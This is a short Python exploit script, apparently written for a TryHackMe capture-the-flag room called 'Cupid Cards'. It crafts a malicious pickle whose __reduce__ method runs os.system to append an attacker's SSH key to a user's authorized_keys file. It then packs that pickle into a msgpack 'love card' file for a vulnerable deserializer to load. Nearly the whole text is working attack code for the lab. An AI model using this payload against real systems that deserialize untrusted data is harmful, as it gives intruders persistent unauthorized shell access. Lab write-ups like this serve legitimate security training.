# script by Claudi for tryhackme room Cupid Cards https://tryhackme.com/room/lafbctf2026-advanced
# YouTube video walk through: https://youtu.be/k6-5rF1tz_U

# create_payload.py
import pickle
import msgpack
import os

class Exploit(object):
    def __reduce__(self):
        cmd = "mkdir -p /home/aphrodite/.ssh &&  echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJI2BElPIcoG98ulZ3uuWJXR77CSYIs6u/g10Fhe76nv cupid@cupidcards' >> /home/aphrodite/.ssh/authorized_keys"
        return (os.system, (cmd,))

malicious_notes = pickle.dumps(Exploit())
print(f"Pickle bytes: {malicious_notes[:20]}")  # Debug - confirm it's bytes
print(f"Type: {type(malicious_notes)}")

data = {
    "from": "cupid",
    "to": "aphrodite", 
    "desire": "A" * 50,
    "compat": {
        "sign": "aries",
        "element": "fire",
        "planet": "mars"
    },
    "notes": malicious_notes
}

# use_bin_type=True ensures bytes stay as bytes
packed = msgpack.packb(data, use_bin_type=True)

with open("exploit.love", "wb") as f:
    f.write(packed)

print("Done!")
print(f"notes type in data: {type(data['notes'])}")
